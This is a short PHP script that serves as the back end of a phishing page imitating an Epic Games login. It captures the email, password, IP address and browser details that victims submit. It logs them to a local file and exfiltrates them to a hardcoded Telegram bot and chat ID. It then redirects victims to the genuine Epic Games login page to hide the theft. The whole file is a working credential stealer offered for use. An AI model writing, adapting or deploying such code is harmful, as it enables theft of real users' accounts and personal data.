<?php
$email    = $_POST['email'] ?? '';
$password = $_POST['password'] ?? '';
$ip       = $_SERVER['REMOTE_ADDR'] ?? '';
$ua       = $_SERVER['HTTP_USER_AGENT'] ?? '';
$time     = date('Y-m-d H:i:s');

// Save locally
$entry = "[$time] $ip | $email:$password\n";
file_put_contents("logs.txt", $entry, FILE_APPEND | LOCK_EX);

// Send to Telegram
$botToken = "8677688801:AAF69bDnyAZAYjDp_q9VRsd3HeHygMHsv5Q";
$chatId   = "8782414005";
$message  = urlencode("🎮 Epic Games Login\n━━━━━━━━━━━━━━━\n📧 Email: $email\n🔑 Password: $password\n🌐 IP: $ip\n🕒 Time: $time\n🖥 UA: $ua");
file_get_contents("https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=$message");

// Redirect to real Epic Games
header("Location: https://www.epicgames.com/id/login");
exit;
?>
